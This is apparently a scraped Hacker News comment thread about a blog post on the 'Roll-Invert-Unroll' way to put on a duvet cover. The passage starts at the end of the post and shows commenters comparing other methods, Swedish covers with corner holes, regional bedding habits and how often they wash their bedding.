me a lot of time and effort, but the reduced frustration in the task of laundry leaves me calmer and feeling less frantic. Additionally, the way in which the duvet cover flips right-side-out during the middle of the process genuinely gives me a sparkle of joy every time I do it. I hope that you try out this method of replacing your duvet cover, and that you find it is useful! This article was filed under: Lifehack RSS Feed © Danver Braganza 2024 About this site",
    "commentLink": "https://news.ycombinator.com/item?id=39877730",
    "commentBody": "Roll-Invert-Unroll: An easier way to replace a duvet cover (danverbraganza.com)381 points by nvader 14 hours agohidepastfavorite211 comments pablobaz 13 hours agoMy preferred technique is to also start with the cover inside out. Then put your hands inside the cyber into its corners. Then grasp two corners of the duvet through the fabric. A bit of shaking to turn the cover the right way out and you are done. reply BrandoElFollito 1 hour agoparentI discovered this method in the early 80s as a kid on French TV. There was a program with Jacques Martin about \"incredible\" stuff. I remember a hairdresser who used a flame and J Martin almost agreed to try, another one about the world record in going back and forth through a door. That one was the world record in how many duvets you can handle in a given time IIRC. Note that this was 80, 81 or around that. This was the only source for such stuff in France so it was a big show (for children at least) reply rigid 1 hour agorootparentI kinda miss the curiosity show. It was a bit more science leaning but got kids to awe just the same way. reply Semaphor 13 hours agoparentprevWhat other way is there? This is how I learned it from my mom and have done it ever since. Edit: I guess there's this rolling method, which seems a lot more convoluted based on the videos. reply pablobaz 13 hours agorootparentIME lots of people just try stuff the duvet in and then shake it to get it in the right place. reply chatmasta 12 hours agorootparentSomeone should write a book called Household Chores for Hackers: The algorithms your mother took for granted and forgot to teach you. reply helsinkiandrew 2 hours agorootparent\"Home Comforts: The Art and Science of Keeping House\" is quite good: https://www.amazon.com/Home-Comforts-Science-Keeping-House/d... reply etrautmann 11 hours agorootparentprevThe book “Algorithms to live by” comes close reply seabass-labrax 10 hours agorootparentWould also highly recommend! It's not quite exactly a practical handbook, and doesn't cover topics such as duvet cover changing, but it is considerably more relevant than most popular science/mathematics books. The very first chapter, for instance, covers the idea of explore/exploit choices, and does so in a way that is both general enough to be genuinely useful in everyday life (at least at a conceptual level) and mathematically rigorous enough not to throw you off should you want to read further. reply dredmorbius 8 hours agorootparentprevOr even ... life hacks.reply TheRealPomax 10 hours agorootparentprevGrab any 1950's \"how to be a good housewife\" book, use a bit of scripting to replace \"housewife\" with \"housekeeper\" and \"husband\" with \"partner\", and republish. reply hamburglar 2 hours agorootparentprevI taught my mother how to fold a fitted sheet. A girlfriend taught me and I was floored at how elegant it is. Prior to that, they just made me angry and ended up in the closet in a wad. reply cianmm 2 hours agorootparentPlease share! reply Ldorigo 12 hours agorootparentprevI would buy it. reply ErigmolCt 11 hours agorootparentI would invest in it reply boothby 10 hours agorootparentprevfolds sheets in the dark reply addandsubtract 9 hours agorootparentThat's a dark pattern reply spuz 12 hours agorootparentprevThis is what I do. I take a corner of the inner and stuff it into the outer until I find the corner of the outer. Then I try to keep those two corners in place while I do the same with the other corner. Then I grab both corners from the outside and do a lot of vigourous shaking until everything lines up. It takes ages and doesn't always work. I think I will try starting inside out from now on. reply vladvasiliu 42 minutes agorootparentI do a modified version: I put all the corners in the right places, then a good shake by holding two adjacent corners straightens everything out. May not work so well for duvets much wider than your arm span. reply zelphirkalt 8 hours agorootparentprevIME neither inside out nor the method you describe work well and both are tedious. Inside out does not work well, because the cover doesn't obey gravity and refuses to fall down to cover the duvet completely. It is a secret power of bed sheet covers. That, or it has to do with other things like friction. reply Jare 11 hours agorootparentprevI do that and while the shaking is unpredictable and often requires doing it from multiple sides, I find it a strong but strangely pleasant exercise for my shoulders. reply Semaphor 13 hours agorootparentprevThat is fascinating. Just asked my wife, who's from another continent, she's as flabbergasted as me. reply pablobaz 12 hours agorootparentAs a kid we didn't have duvets. It was all sheets and blankets. Duvets were a bit new-fangled so it's not surprising the knowledge wasn't passed down. reply stephencanon 12 hours agorootparentprevThe rolling method is really exactly the same thing, but some people find it easier to think about reaching in for the corners after rolling, and you don't need to be tall enough to let it fall down into place (wife is 5'4\" and rolls, I'm 6'4\" and just reach for the far corners). reply bootsmann 12 hours agorootparentThe duvet is like a parachute, you don’t need to shake it in from the top you can shake it in like a magician doing the table clearing trick. reply Semaphor 12 hours agorootparentprevIf it's the same, then some people here posted really bad videos of it ;) FWIW, my wife is tiny (160cm) and still does the reverse grip method reply ErigmolCt 12 hours agorootparentprevThis is a skill that is passed down to us through \"inheritance\" reply sunshowers 12 hours agorootparentprevI use the rolling method for the joy it brings each time :) reply bjackman 1 hour agoparentprevI always change the sheets in our house because my partner absolutely hates doing it. I recently realised this is because she has dramatically less upper-body strength than me, the \"bit of shaking\" is pretty exhausting for her with our heavy winter duvet. So this technique could be really useful for people with her build! reply megadog3 13 hours agoparentprevI call this the ghost method, because you look like a ghost with your arms through the inverted duvet cover. reply Tomte 13 hours agorootparentMy girlfriend insists that the your head does not go inside. But why would you forgo all that fun? reply groestl 11 hours agorootparentprevI do that with my kid. For funsies. Also high in the list: snake bites foot (to put on his tights). reply lagrange77 13 hours agoparentprevI think this is the official strategy, i've never seen someone using a different one. reply worddepress 4 hours agorootparentI used to do the shove it in and frantically thrash until it take shape. Then I learnt this system and it is much easier. For a king size: maybe just get someone to help. reply eternauta3k 4 hours agorootparentprevI googled this when I first moved to a duvet country and adopted this exact method. reply mynegation 8 hours agoparentprevThat works but it is hard to use that technique on king size duvet. I essentially use the technique described in the article by starting with the cover turned inside out on top of duvet, tying all corners and then reaching through the cover opening for the far side and pulling it in instead of rolling and unrolling. reply Sprint9935 6 hours agoparentprevI use the same method. Although when reaching into the cover to its corners, I sometimes put my head in too. I stand up like some sort of inverted-duvet covered ghost and give the dog a fright. Then I continue the process again. reply chatmasta 13 hours agoparentprevYeah, I don't think there's a need for the roll. You just need to make sure you can hold it high enough in the air to shake the thing without letting the bottom rest on the floor. I just think of it like a really big pillow case. I put the pillow case on inside out so I do the same for the duvet cover. I don't remember where I picked this up either, but I do remember it caused an ex girlfriend to get irrationally angry and tell me I was doing it wrong... that's when I knew she wasn't a keeper! reply globular-toast 13 hours agorootparentI think it could be useful for shorter people who can't hold it up high enough. I just hold it up and shake it, though. reply Grustaf 2 hours agorootparentYeah there is no need to have it hanging down, shaking it like a whip has the same effect. reply Macha 11 hours agorootparentprevAs a short person, my strategy is to stand on the bed for extra height for this method. Or just be lazy and accept the slightly uneven distribution, which works itself out after the first night anyway. reply dzhiurgis 1 hour agorootparentprevI’m tall but got super king sheets. I much prefer roll method which is just less faffing around. reply hoyd 45 minutes agoparentprevMy favorite too reply karmakaze 9 hours agoparentprevYeah when I read this, I thought the step of tying all the corners seemed more than necessary. You only have to hold two of the corners and pull/shake. reply VagabundoP 3 hours agoparentprevYup, this way and you're done in a minute or two. reply clnhlzmn 12 hours agoparentprevYeah I find the rolling method is more work than it’s worth when the “grab the corners and shake vigorously” method works just fine. reply dzhiurgis 1 hour agorootparentShaking is far more exhausting, dusty and not foolproof. Roll method is no brainer, esp on large sheets. reply rSi 11 hours agoparentprevWTF!? I heard before that putting a cover on a duvet was a thing, a problem, a mystery... are ppl making this up? is this a joke I don't get invert, tie corners together and what not... my family and everyone i know do it the way @pablobaz describes it. it's simple and effective. change sheets whenever you feel like doing it, because its easy and fast... endof story reply devbent 4 hours agorootparentI've only ever known cramming it inside and then crawling inside with it to try and get the duvet into place. I grew up in a family that had (home made!) blankets and quilts, duvets were not a thing until I moved out on my own. reply dgfitz 11 hours agorootparentprevHard agree. Changing a duvet cover is not hard. Maybe we are just getting stupider as a species. reply uoaei 8 hours agorootparentIn terms of cultural knowledge, it does seem like certain things were taken for granted by previous generations and not handed down in ways that younger generations can manage. reply dzhiurgis 1 hour agorootparentprevYou are simply ignorant of how large duvets can get (taller than 99th percentile). reply mlok 11 hours agoparentprevI was never taught this, but I ended up \"reinventing\" it a few decades ago, certainly because this is the most efficient way ? I have always used this technique since. reply ErigmolCt 11 hours agoparentprevI remember how my parents used to do this together the same way you describe, and I was always getting in their way. It was a lot of fun. reply barbazoo 11 hours agoparentprevThat’s how I learned it from my mama and that’s what ill teach the children. reply louthy 12 hours agoparentprevThis is the way reply sandesh247 13 hours agoprevhttps://www.youtube.com/watch?v=EFOhjljieqs same method, but in video form. reply mderazon 11 hours agoparentReminds me of these topology tricks https://www.youtube.com/watch?v=6ebiyOtn7NA reply Kailhus 11 hours agorootparentSorcery! reply penguin_booze 4 hours agoparentprevBack then, I learned to swim via a correspondence course. Thank goodness for video these days. reply hackernewds 12 hours agoparentprevmuch better with this advance technology reply greggsy 11 hours agorootparentWhile it was quaint to read through the high effort blog post, it was like reading a cooking blog that starts off with reminiscing about travels through an Italian village where they learnt how to make toast. reply MichaelZuo 10 hours agoparentprevThis could also be an interesting Topology lesson. reply jonathanlydall 1 hour agoprevSomewhat relatedly, if you use elasticised fitted sheets, you may not be aware (I wasn’t for the first 25 years of my life) there is a simple trick to being able to fold them neatly when not in use. Essentially you fold it twice so that all four corners are “on top” of each other, then you tuck all the elasticised corners into each other. You should now have it looking quite neat with one corner being a little cut off, but still otherwise neat, see step 4 here: https://images.app.goo.gl/yfg4BnqxjuB2ztwv6 You can then fold it over in what ever way you want to make it rectangular. reply KptMarchewa 6 minutes agoparentMy question is just why? They are perfectly good in a ball form. reply napoleongl 13 hours agoprev” Imagine replacing your duvet cover in minutes” When i was 18 and begun my career I hospitality, we’d change a twin bed completely in like 3-4 minutes. How do you spend minutes with just one duvet (excluding disabilities but that’s quite obvious). Also, this is why Swedish duvet covers have holes in the upper corners, just reach through them and grab the liner and pull it in, shake a bit, and you’re done. reply toxik 1 hour agoparent> Also, this is why Swedish duvet covers have holes in the upper corners, just reach through them and grab the liner and pull it in, shake a bit, and you’re done. Just as an FYI, this is going away. At least IKEA stopped doing this. From what I heard, people complained thinking the holes were made in error. Stupidity wins again. reply spuz 11 hours agoparentprevI can think of lots of reasons. My double bed is in the corner of a small room so I only have access to one side of it. Lifting the mattress to put on a fitted sheet is very awkward and pretty strenuous. This also means that there isn't much room for laying out both a duvet and duvet cover. Typically I lay them both on the bed at the same time because I don't want either to touch the floor which makes inserting the duvet into the cover even more awkward. Next is the fact that a double sized duvet is almost but not quite square. It's quite easy to grab a corner of the duvet and match it with the wrong corner of the cover. Lastly, I only do this about once a week not 10 times a day so I haven't had a need to find a better method so far. reply madaxe_again 45 minutes agorootparentOurs is against three walls - you can only access the bed from the foot. It’s also four feet up in the air as we put a closet under the bed. Turns out you can put on a fitted sheet while you’re on the bed really easily - just lift the head, bending the mattress and the corners in slightly, get the corners on, then off you hop and pull the corners onto the foot - takes 30 seconds at most, and there’s no walking around or lifting the entire mattress. reply narag 12 hours agoparentprevI do it in fifteen seconds at most, stuffing it without any consideration just keeping two corners in one hand, then matching them with two cover's corners and gently shaking. Also genuinely baffled about the article, but to be honest, not the first time that I hear someone hating the procedure and describing some problem that I don't understand. reply sundvor 10 hours agorootparentMaybe 30s here, but I'm not claiming to be the fastest; I'm wondering if body length is a factor. As a somewhat tall person (189cm) in my 50s I never had any issues changing doona covers. Had a much shorter girlfriend at one point who simply said \"that's not fair\" when she saw me do it. reply thom 10 hours agorootparentNot sure you have to be tall, you can do this flat on a bed just by shaking from the bottom instead. reply olejorgenb 11 hours agoparentprevVisual: https://knotte.com/pages/nordic-design-duvet-cover-hand-pock... reply dzhiurgis 1 hour agoparentprevI hope you are not sleeping with same duvet since you were 18… reply nvy 13 hours agoparentprev>How do you spend minutes with just one duvet Ours is supremely irritating because the duvet gets folded over or bunched up inside the cover and shaking it does not fix this. So I have to get bodily into the fucking cover and stick each corner in place. It's infuriating and I hate duvets for this reason. reply noduerme 13 hours agorootparentI once zipped my girlfriend up inside a cover while she was doing this, it was quite funny. reply ignoramous 13 hours agorootparentgzipped. reply vundercind 12 hours agorootparentGod damnit. Now I’m bound to someday call it “girlfriend zip” out loud at work and it’s gonna be a whole thing. reply napoleongl 12 hours agorootparentprevI guess I’ve been lucky in which duvets and liners I have met in my life. Only time I’ve met opposition is with flannel covers, but those are just horrible in all other ways except for starting fires. reply spurgu 13 hours agoprevWhere I'm from we have holes in the top corners of the cover. Just put your arms in there, grab the duvet and pull it in, shake it a bit, done (additionally you might need to fix the bottom corners and shake again). I was surprised when I went to other countries where you have to fiddle with only a bottom opening. reply Permik 12 hours agoparentFellow Finn here, I'm flabbergasted how the rest of the world hasn't figured this out apart from us in the nordics :D reply fmbb 11 hours agorootparentIn 2007 Ikea stopped selling duvet covers with holes in the corners. “It’s for the international market” they said. There was a national uproar. People no longer knew how to make their beds. Attempts were made at convincing them to bring the holes back but without success. We have now settled for the typical Swedish response of making an angry fist with the hand securely hidden inside a pants pocket. reply ghnws 10 hours agorootparentI refuse to buy any duvets that don't have the holes. It's too much of a convenience. reply whizzter 5 hours agorootparentI was annoyed at first and iirc my ex-GF cut the corners, once I realized the put-hands-inside-edges-of-inverted-cover-and-grab-the-duvet-corners-and-pull-through method I've mellowed on them since it goes fairly quickly. reply Ekaros 11 hours agorootparentprevI personally just used the covers alone, but I also found out that finally there is some with buttons or even with zipper. And pillow covers with zippers are amazing. reply derbOac 10 hours agoparentprevWe've had multiple covers, and the one that we've liked the most has holes in the top corner, along with ties. Long story but we went to someone to have a cover custom made (she advertised this kind of thing, and for us it was partially to use fabric that had sentimental value for us). She ended up arguing with us about how we didn't need the holes, and demonstrated this flip move that seemed impractical for a large comforter. I wish all duvets and covers had ties, and more importantly covers with holes. It's so much simpler and direct a solution. reply Grustaf 3 hours agoparentprevEven without the holes, you can just do the same thing by inverting the corners and grabbing the duvet through that. reply madaxe_again 43 minutes agoparentprevI have no idea where my wife found them but we have duvets with an opening ⅓ of the way up, ½ the width of the duvet. Means you can’t invert it, instead just the top corners out through the hole, and I usually need to use my teeth as a third hand while I use the others to stuff the duvet in through the hilariously tiny aperture. reply bhaney 12 hours agoprevI wasn't even aware duvets were still used outside of hotels. You guys don't just have sheets and a regular blanket on your bed? Is it a cultural/regional thing? They seem very annoying to deal with and I've never found them to be particularly comfortable, so I'm surprised so many people here seem to use them. reply fnordpiglet 12 hours agoparentYou can have a much higher quality material for both inside and outside, and washing the cover is easier than a full comforter. You wash the inside more rarely with a duvet cover. You can also have one inside and many covers for variety of styles during seasons without having an entire room of the house for storing comforters reply fshbbdssbbgdd 11 hours agorootparentVacuum bags are good for storing that kind of stuff compactly. My duvet and duvet covers semi-permanently live in one! The only kind of blanket I’ve found that is not too warm is gauze. reply timbaboon 12 hours agoparentprevHaha amazing, I’ve now just discovered that some places don’t use duvets. I thought (naively) that it was worldwide… reply tdiff 12 hours agorootparentExactly, living in Europe, I've literally encountered the sheet+blanket combination for the first time a week ago, in a hotel. Duvets with covers ARE the norm. reply vundercind 12 hours agorootparentWait… you don’t use a sheet under a duvet? What do you wrap under yourself? Not the duvet, that’d be too thick, surely. reply Jare 11 hours agorootparentA sheet covering the mattress, then we lying on top, then the duvet covering us to varying degrees of area and precision depending on temperature and activity while asleep. My son snakes over and under the duvet several times along his body. reply vundercind 10 hours agorootparent“Fitted sheet” (sheet with elastic on the corners, a little smaller than a same-nominal-size sheet) that covers the mattress, regular sheet, optional light blanket, comforter, optional quilt or something like that if it’s very cold. That’s standard bedding around here (US Midwest). This duvet-only (not counting mattress cover) stuff is wild to me. May have to try it. reply tdiff 11 hours agorootparentprevI meant a second sheet between you and a duvet. Ofc there is another one covering the matress. reply mrbadguy 3 hours agorootparentThe duvet cover is, in effect, the second sheet of which you speak ;) reply 331c8c71 3 hours agorootparentprevWhat? Heresy! ;) reply wrp 12 hours agoparentprevI think it's regional. Growing up in the western USA, I never saw a duvet with a removable cover. Living in Japan/Korea, I've never seen people use the sheets+blanket arrangement in the home. BTW, I first heard the word \"duvet\" as a teenager watching British comedy on PBS. I had to look it up in the dictionary. reply vundercind 12 hours agorootparentGrew up in the Midwest. Unusual in my family and circles. I’ve known what they are since some time in my teens (there’s… a chance the film Fight Club’s actually the first time I both encountered the word and put together some idea of what it specifically meant, though I’d heard it before and thought it was just a fancy word for “comforter”) but we never had any, I’ve never put a cover on one, and I’ve never seen someone putting a cover on one. reply Unbeliever69 12 hours agoparentprevMy absolute favorite items in this world are my down comforters and duvets. I have a thick one for winter and a thin one for summer. Sometimes I have them both on the bed and use one as a snuggle blanket. Every night when I crawl in bed it is a form of catharsis like a cat making biscuits. reply Nition 12 hours agoparentprevDuvets are really warm, good in winter for cold houses without good insulation. Often they're as warm as three or four or even five woolen blankets, but much lighter. Four blankets on top of you is heavy. I find them annoying in hotels though, where the rooms are usually pretty warm. They use relatively thin inners but they're still usually way too hot for the conditions. reply bgnn 1 hour agoparentprevI've never seen anyone using a sheet and blanket to be honest. In Europe at least, duvet is the obly thing people have. reply timthorn 44 minutes agorootparentI grew up with sheets and blankets in the UK. Can't beat that tucked in feeling. reply laurent_du 1 hour agoparentprevThat's funny, hotels are the only places where I see sheets and blanked being used. reply Macha 11 hours agoparentprevI take it you're in a warmer climate, a regular blanket is insufficient for many months of a year here. Like growing up, I had multiple blankets and a duvet, and had similar in some less well insulated houses I've lived in. My current house is better insulated, so a duvet on its own is generally sufficient. reply bhaney 9 hours agorootparentI don't know what you consider to be a warmer climate, but I'm in the midwest US and it goes from around -10°F to 110°F here throughout the year. The temperature outside has pretty much nothing to do with my choice of bedding though, because it's always within 1° of 67°F inside my home unless my HVAC system is broken. I know a lot of places aren't as into complete climate control as we are around here, so it makes sense that those places would have different priorities when making bedding choices, now that I think about it. Thanks for sharing. reply test1235 1 hour agorootparentHere in scotland, uk, in winter, the interior temp of my house will drop to 16 or 17°C overnight, from its regular temp of 20/21°C during the day when the heating is on. Outside temperature range round here is maybe -6°C to 24°C I don't know what standards the RoW uses, but we have a TOG rating here for our duvets ... we have a 4 for summer, and 13 for winter. https://en.wikipedia.org/wiki/Tog_(unit) https://en.wikipedia.org/wiki/Climate_of_Scotland#Temperatur... reply 8organicbits 11 hours agoparentprevThere's some articles that discuss this switch. It may be a generational preference. https://www.yahoo.com/lifestyle/why-millennials-aren-apos-t-... reply vcxy 6 hours agoparentprevI didn't know what a duvet was until I was an adult. Grew up with sheets and quilts in Appalachia. reply n1b0m 5 hours agoparentprevIt’s pretty common in the UK. Maybe to do with the colder climate. reply KerrickStaley 11 hours agoparentprevNone of the apartments I've lived in for the past few years have had a washer large enough to wash a king-sized comforter, so I use a duvet instead. reply thenoblesunfish 3 hours agoparentprevVery common in Europe reply gr8r 7 hours agoparentprevI didn't even know duvets were used in hotels. But the OP post did make me think of this: https://www.youtube.com/watch?v=LYJz8tVN7fg reply zoklet-enjoyer 12 hours agoparentprevMost of the people I knew in Australia 10 years ago had duvets. I never even knew what a duvet was until I went to Australia. Moved back to the US and got one. I can only think of one other person I know here who has a duvet reply edward28 12 hours agorootparentAlso we call them doonas. reply zoklet-enjoyer 8 hours agorootparentHaha yeah I knew it as a doona before I knew it as a duvet. reply Grustaf 3 hours agorootparentprevWhat do others use then? reply logro 10 hours agoparentprevDude, a toasty hot duvet in a freezing cold bedroom far in the northern hemisphere is something you're missing out on. reply fellowniusmonk 13 hours agoprevFor a queen size duvet I just stuff the entire duvet inside the cover and then align the two corners farthest from the hole, pinch from the outside and shake, takes less than a minute if I'm in a rush and no inversion required. I do have very long arms though, and maybe this would be faster for a king size duvet cover. reply derbOac 10 hours agoparentThis is what I do as well basically. It's usually more confusing to me to figure out what's top and bottom versus sides than to actually put the cover on. reply vik23052016 13 hours agoprevThis practice of roll-invert-unroll is very common in India. I recall putting on liners on beddings and blankets when I was ~6 year old in the 1990s. I didn't realize until I saw comments that it's not the normal way here in western parts. I think may be hospitality industry may use it already and not commonly documented. Thanks for documenting it. Now I have a blog to point to when teaching my kids. reply pandemic_region 13 hours agoparentThis is not a western parts thing, just one guy discovering something most consider common knowledge here. reply cinntaile 2 hours agoprevThis can be easily solved by having 2 holes at the top corners, it makes life so much easier when adjusting and inserting the duvet. No need for any convoluted methods like roll-invert-unroll. reply kirenida 12 hours agoprevRelated question: what method do you use to keep the duvet in place inside the cover? I have some animal themed safety pins that my parents used on my duvet since I was a child. I put four of them in a square shape around the middle of the cover when the duvet is inside. reply mlok 11 hours agoparentIf needed, I grab a cover border, and align the duvet border within it, make sure corners are aligned too, and then again : shake it. It comes back to place. reply Chaosvex 10 hours agoparentprevButtons? A zip? I've never seen a cover that doesn't have a way of keeping it closed. reply kirenida 2 hours agorootparentKeeping it closed is not the problem. The problem is that the duvet bunches up inside the cover if you move around a lot during sleep. reply dgfitz 11 hours agoparentprevIt just stays. reply sunshowers 12 hours agoparentprevMy duvet covers have ties you can use against any duvet. My parents used to use safety pins. reply fifilura 2 hours agoprevIn Sweden all covers used to have holes in the upper corners. Really easy, just stick your hands in and pull the duvet out. Rumor has it thay IKEA stopped selling covers with holes at the top because lots of people came back and said they were broken. And now others are doing the same. Using duvet covers is very common in Sweden. reply sajb 2 hours agoprevI don't see this method working very well for me since I always use duvets that are wider than the bed, which I thought was the norm. Same width as the bed makes for tug-of-war with the sleeping partner. 120 cm wide bed -> 150 cm duvet, 140-160 cm bed -> 240 cm duvet reply twodave 13 hours agoprevI think you might also just roll the inner up, stick it the bottom of a collapsed cover, then grab both an exposed inner corner + side of the cover in each hand and stand up with it, shaking a bit to get it to unroll on the way down. reply twic 11 hours agoparentThis is what I do. I don't actually roll the duvet up, just do a rough concertina fold reply bgnn 1 hour agoprevMy grandma and mom are doing it like this, for generations as far as I know. reply harimau777 5 hours agoprevIs this a European thing? I've never even heard of a duvet. reply worddepress 4 hours agoparentHow do you keep warm at night in the USA? Blankets and sheets I am guessing? reply MichaelDickens 4 hours agorootparentI live in the USA and I see duvets almost everywhere. But I presume GP uses blankets. reply Grustaf 3 hours agorootparentPresumably they put a sheet or something washable between themselves and the blanket though? reply Grustaf 2 hours agoprev> Other expert voices say we should be doing this fortnightly, or even weekly. Even as a bachelor I wouldn’t wait two weeks to change the duvet covers, I hope most people change the covers when the change sheets? reply nlawalker 13 hours agoprevBeen doing this for years, sans the roll/unroll. After tying the corners, reach all the way inside the inside-out cover, grab the two corners furthest from the opening, pull all the way through, and shake. reply lifeisstillgood 13 hours agoprevNot only am I going to try this, I think it’s a YouTube sensation in the making reply m463 13 hours agoparentright up there with japanese shirt folding: https://youtu.be/b5AWQ5aBjgE reply nodoodles 33 minutes agorootparentand folding plastic bags into triangles for storage reply ninkendo 11 hours agorootparentprevI remember learning this and thinking it was so cool. Then I realized how much effort it takes to lay a shirt so flat and straight on a flat surface in the first place, and I went back to my “grab the shoulders, shake the middle away from me, bring them together, tuck sleeves in while folding in half” way I’ve always done. Half the work of shirt folding is getting the shirt to a known orientation anyway, I much prefer letting gravity do the work here. reply karaterobot 13 hours agorootparentprevInteresting that this is referred to as Japanese shirt folding. This is how I learned to do it decades ago, and there was no Japanese attribution at the time. I wonder if it is claimed (by whom?) to have been invented in Japan, or if it's just because the video is in Japanese. reply dist-epoch 12 hours agorootparentI learned about it from the Superdry brand which is a Japanese brand. reply n4r9 11 hours agorootparentSuperdry is a UK brand. They just make use of Japanese aesthetics. reply seabass-labrax 10 hours agorootparentAnd even that is suspect, considering that the Japanese text is nonsense and the clothing is of course not produced in either Britain or Japan[1]. Kudos to them for actually specifying their factories though! [1]: https://corporate.superdry.com/media/mswf3cml/public-factory... reply vundercind 11 hours agorootparentprevExact same video where I first saw this. I love the audio. reply lamontcg 12 hours agorootparentprevAnd ranger rolling your t-shirts: https://www.youtube.com/watch?v=fuD-ZZydsVg reply mderazon 11 hours agorootparentT-shirts are the easiest thing to fold. The real nightmare is the wife's pile of clothes. Every piece of clothing is unique and different in shape and size. Some of them I wouldn't even know how to wear let alone fold reply jaynate 6 hours agoprevI get inside the duvet cover. Pretend I’m a ghost. And have my wife hand me the comforter from the bottom. Bit of a workout. Works great. reply michaelhoney 11 hours agoprevIn Australia a duvet is called a “doona” and while there are some perverts who use a sheet between person and doona (these are people who don’t like to wash doona covers), fitted-sheet=>sleeper=>doona is the standard reply derbOac 9 hours agoparentI'm in the US and we use a flat sheet between us and the duvet cover. We wash the duvet cover but the flat sheet gets washed more often and is less expensive to replace, and is replaced more often (nothing gets replaced that often, but relatively speaking). I don't think there's really any right way of doing things though. Sometimes I wonder if we should just have a linen blanket or something on top in the summer but we never seem to get too hot somehow, and I've never managed to find a top blanket that is the right size and that we like. (I'm also not really sure I want to store our duvet just for the summer either but that's solvable.) reply dzhiurgis 1 hour agoparentprev> perverts I do this during hot nights - easier to micro-regulate your body temperature with a extra thin layer. Easier to wash is a bonus. Plus they tend to be finer quality. reply neilv 9 hours agoprevPeople need to stop doing dark pattern cookie consent UI. reply deathanatos 6 hours agoparentIt's kinda weird? > We use cookies and other tracking technologies to improve your browsing experience on our website, to show you personalized content and targeted ads, to analyze our website traffic, and to understand where our visitors are coming from. Like … I'm on what appears to be a person's blog. Who's \"We\"? What personalized content could one possibly receive from someone else's blog? (And of course, oh boy targeted ads.) Like … maybe some sort of out of the box thing gone amok, but the about page seems to indicate it's a pretty homegrown blog…? The web is becoming downright tiresome. reply deathanatos 6 hours agoparentprevIt's kinda weird? > We use cookies and other tracking technologies to improve your browsing experience on our website, to show you personalized content and targeted ads, to analyze our website traffic, and to understand where our visitors are coming from. Like … I'm on what appears to be a person's blog. Who's \"We\"? What personalized content could one possibly receive from someone else's blog? (And of course, oh boy targeted ads.) Like … maybe some sort of out of the box thing gone amok, but the about page seems to indicate it's a pretty homegrown blog…? reply jrockway 13 hours agoprevI go into the duvet cover with the duvet. Hold the two upper corners, put the duvet cover over your head, attach each corner of the duvet to the corresponding corner in the duvet cover (I buy ones with strings for this purpose). Then extricate yourself, hold the corners you just attached, shake vigorously, handle fine alignment of the bottom corners, and button the thing up. I am sure people will make fun of this but I get it done in a minute (buttoning all the buttons at the bottom is the hardest part), and I do wash it every 2 weeks, so... poke fun all you want, at least I'm not rolling around in filth from a month ago. reply xupybd 3 hours agoprevJust stand in the cover and drag the inner to the corners. It's so easy reply llimos 12 hours agoprevI vary it based on if the cover came out the machine inside out or not. If it did, I spread out the duvet, burrow inside the cover, grab the far corners of the cover from the inside and then through it also the corners of the duvet at the same time, and invert it. If it came out the right way round, I spread out the cover, grab two corners of the duvet, burrow inside the cover with the two corners of the duvet until they reach their destination, and come out again. reply mch82 7 hours agoprevThe correct technique is to replace a duvet cover by going to the store and purchasing a comforter. Ideally, purchase two comforters and alternate the one you’re washing with the one you’re using so that the bed is never without one. :-) reply causality0 4 hours agoparentI think there's a gap between the \"bedroom is center of home\" people and the \"bedroom is for sleeping\" people. For the former, they value things like changing the appearance of the bed for seasonal or taste-based reasons. For people like me in the latter category, the things on the bed are like the floor mats in my car: as long as they're clean I don't give a damn what they look like. They're purely functional objects that I don't even see for more than a few seconds a day. reply NeoTar 13 hours agoprevIf you’re only changing your duvet cover once a month (or less) you’re sleeping under a sheet under the duvet, right? We don’t do sheets and are in the change once a week camp. reply forgotusername6 12 hours agoparentNope. Duvet changes every couple of months perhaps. Sleep straight under the duvet. Thought this was normal. Never heard of a sheet under the duvet reply skeletal88 12 hours agorootparentThen it is like changing your shirt every two months? You do sweat when sleeping. reply Underphil 5 hours agorootparentIt's fine to question it, but when questioning something millions of people do every day, year in year out, you might want to find a different hill to die on. See also : Time format, waste disposal units etc. reply jebarker 12 hours agorootparentprevPresumably they wash though, probably after getting out of bed. reply groestl 11 hours agorootparentAnd before crawling into it. reply bruce343434 8 hours agorootparentEither way the duvet will accumulate grime at night that someone should be able to smell. I wash and change my bedding weekly and am disgusted by the low frequency others are reporting. Who enjoys the texture of besweated beddings? I can certainly tell the difference and I love clean sheets and hate stale ones! How do people not feel or care about this sensation?? Especially if you have sex on sheets that you don't wash for weeks. Holy ew. reply Underphil 5 hours agorootparentIt is certainly strange when you find out that other people have different tastes and viewpoints to you. reply Unbeliever69 12 hours agoprevMy preferred technique is to grab a corner, crawl inside the duvet and pin it to the corresponding corner. Then I crawl out and repeat with the opposite corner. From there, I just pull the front two corners over the comforter then button/zip it up then furl it out. I'm not saying this is the best method but it works fine for me. My wife has no techniques that work for her, lol. reply ssijak 3 hours agoprevHire somebody to do it for you. Profit. reply frenchie4111 12 hours agoprevCan someone make a diagram or video for us visually minded folk edit: nvm found it in a sister comment reply orliesaurus 12 hours agoprevKinda off topic but what is the name of the background on this blog? i.e. those patterns do they have a name? My mom used to have the same patterns on some sheets as a kid but no clue what they're called? reply mcBesse 4 minutes agoparentArticles of Interest podcast did an episode on Paisley if anyone wants to know more reply whiw 12 hours agoparentprevPaisley pattern. Oh, somebody beat me to it. reply rfwhXQ5H 12 hours agoparentprevPaisley reply alargemoose 13 hours agoprevCame across this right before I start laundry, looks like I have a test to run! reply shrubhub 3 hours agoprevThis is an April fools, right? reply SmellTheGlove 11 hours agoprevOur duvet covers all have two fabric loops in the corners. You push a bit of the duvet through those and then just pull it over. Works very nicely. reply theNJR 11 hours agoprevRelated question. Why is it that those damn strings break off after a few years? There must be a better way of attaching. Drives me nuts. reply lumost 13 hours agoprevBest decision I ever made was to skip the duvets and buy a polar fleece blanket for $30. Not to hot, not to cold, machine washable and $30. reply tokai 12 hours agoparentYou'll make a ton of microplastic washing a fleece blanket often. reply causality0 4 hours agoprevAfter living with a duvet cover for a year I decided the entire concept was patently moronic and went back to a simple blanket. reply EVa5I7bHFq9mnYK 11 hours agoprevImages don't show in my Firefox. reply timvisee 11 hours agoparentIt does for me. Firefox on Android. reply HarHarVeryFunny 12 hours agoprevHoly crap! I've been wrestling with duvet covers the wrong way my whole life! The Rachael Ray video @sandesh247 posted shows how simple this is. https://www.youtube.com/watch?v=EFOhjljieqs reply ww520 13 hours agoprevWas it how topology was invented? reply acchow 13 hours agoprevI learned this from my grandmother’s domestic helper in Hong Kong. Brilliant trick! reply mixmastamyk 13 hours agoprevI couldn't understand past the part where it was rolled down to the bottom, Fig 6. However, this was never a problem for me. I simply grab the top corner of the inner part 